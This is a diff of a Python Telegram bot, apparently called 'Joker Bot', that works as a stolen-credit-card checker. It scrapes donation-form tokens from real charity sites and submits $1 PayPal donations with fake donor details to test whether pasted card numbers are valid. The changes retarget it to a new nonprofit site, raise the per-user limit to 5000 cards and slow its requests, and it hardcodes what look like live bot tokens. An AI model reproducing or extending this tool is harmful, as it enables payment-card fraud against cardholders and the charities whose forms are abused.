@@ -3,10 +3,10 @@ from user_agent import generate_user_agent
 from datetime import datetime, timedelta
 import string
 
-BOT_TOKEN = "8732070263:AAHwNJj0plhZpVuYBNZV5T4RZvQ-2USBWNk"
-ADMIN_ID = 1093032296  # غير ده بإيديك انت
+BOT_TOKEN = "8520709238:AAFf1psOsYuulYR2goGOYEObBunbd42mlrA"
+ADMIN_ID = 1093032296
 active_scans = {}
-MAX_CARDS_PER_USER = 1000
+MAX_CARDS_PER_USER = 5000
 
 # ==================== الأسماء المزخرفة ====================
 GATEWAY_DISPLAY = "𝚙𝚊𝚢𝚙𝚊𝚕 𝚌𝚞𝚜𝚝𝚘𝚖 𝚌𝚑𝚊𝚛𝚐𝚎 𝟷$"
@@ -213,7 +213,7 @@ def generate_fake_data():
     email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
     return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}
 
-# ==================== دالة الفحص الرئيسية (بوابة LAPovertyDept) ====================
+# ==================== دالة الفحص الرئيسية (الموقع الجديد) ====================
 def look(cc_line):
     try:
         number, month, year, cvc = [x.strip() for x in cc_line.split("|")]
@@ -230,13 +230,15 @@ def look(cc_line):
     user = generate_user_agent()
     
     try:
+        # الموقع الجديد
         url = 'https://presentationsknights.org/#doante-form'
-        url_ajax = 'https://presentationsknights.org/wordpress/wp-admin/admin-ajax.php'
+        url_ajax = 'https://presentationsknights.org/wp-admin/admin-ajax.php'
         
         headers = {'user-agent': user}
         r = s.get(url, headers=headers)
         html = r.text
         
+        # استخراج البيانات من الصفحة
         form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
         form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
         form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
@@ -249,21 +251,36 @@ def look(cc_line):
             'give-honeypot': '',
             'give-form-id-prefix': form_prefix,
             'give-form-id': form_id,
-            'give-form-title': 'One Time Donation',
+            'give-form-title': 'Donate',
             'give-current-url': url,
             'give-form-url': url,
-            'give-form-minimum': '1',
-            'give-form-maximum': '1000000',
+            'give-form-minimum': '1.00',
+            'give-form-maximum': '999999.99',
             'give-form-hash': form_hash,
-            'give-price-id': 'custom',
-            'give-amount': '1',
+            'give-price-id': '3',
+            'give-recurring-logged-in-only': '',
+            'give-logged-in-only': '1',
+            '_give_is_donation_recurring': '0',
+            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+            'give-amount': '1.00',  # $1 بدل 100
+            'give-recurring-period-donors-choice': 'month',
+            'give_stripe_payment_method': '',
             'payment-mode': 'paypal-commerce',
             'give_first': fake['first_name'],
             'give_last': fake['last_name'],
+            'give_company_option': 'no',
+            'give_company_name': '',
             'give_email': fake['email'],
+            'give_comment': '',
             'card_name': fake['card_name'],
             'card_exp_month': '',
             'card_exp_year': '',
+            'billing_country': 'US',
+            'card_address': '1 Rowe Ave',
+            'card_address_2': '',
+            'card_city': 'New York',
+            'card_state': 'CA',
+            'card_zip': '90001',
             'give-gateway': 'paypal-commerce',
         }
         
@@ -525,7 +542,9 @@ def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
             ]
         }
         edit_telegram(chat_id, initial_message_id, f"<b>Gateway:</b> {GATEWAY_DISPLAY}\n<b>By:</b> {BOT_SIGN}", buttons)
-        time.sleep(random.uniform(8, 12))
+        
+        # التأخير 20-30 ثانية (الأمان)
+        time.sleep(random.uniform(20, 30))
     
     final_msg = (
         f"<b>🏁 Scan Finished!</b>\n\n"
@@ -540,17 +559,22 @@ def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
 # ==================== معالج الأوامر ====================
 def handle_updates():
     offset = 0
-    print("✅ Joker Bot is running on LAPovertyDept.org with $1...")
+    print("✅ Joker Bot is running on operationhappynurse.org...")
+    print(f"👑 Admin ID: {ADMIN_ID}")
+    print(f"📋 Max checks per user: {MAX_CARDS_PER_USER}")
+    print(f"🔄 Time sleep: 20-30 seconds")
     
     while True:
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
             resp = requests.get(url, timeout=40)
+            
             if resp.status_code != 200:
                 time.sleep(5)
                 continue
             
             updates = resp.json()
+            
             for update in updates.get("result", []):
                 offset = update["update_id"] + 1
                 
@@ -620,12 +644,13 @@ def handle_updates():
 /reset <user_id> - Reset checks
 ━━━━━━━━━━━━━━━━
 <b>📋 User Commands</b>
-/pp - Check card
+/pp card|month|year|cvv - Check card
 /mypoints - My points
 /redeem <code> - Redeem code
 /start - Main menu
 /cmds - Show commands"""
                     else:
+                        remaining = get_remaining_checks(chat_id)
                         cmds = f"""<b>📋 Available Commands</b>
 ━━━━━━━━━━━━━━━━
 /pp card|month|year|cvv - Check card
@@ -634,7 +659,7 @@ def handle_updates():
 /start - Main menu
 /cmds - Show commands
 ━━━━━━━━━━━━━━━━
-📋 Remaining: {get_remaining_checks(chat_id)}"""
+📋 Remaining: {remaining}"""
                     send_telegram(chat_id, cmds)
                 
                 elif text == "/mypoints":
@@ -780,7 +805,7 @@ def handle_updates():
                     except:
                         send_telegram(chat_id, "❌ /code <hours> <user_id optional>")
                 
-                # ========== أوامر الفحص الأصلية ==========
+                # ========== أوامر الفحص ==========
                 elif text.startswith("/pp"):
                     parts = text.split(maxsplit=1)
                     if len(parts) < 2:
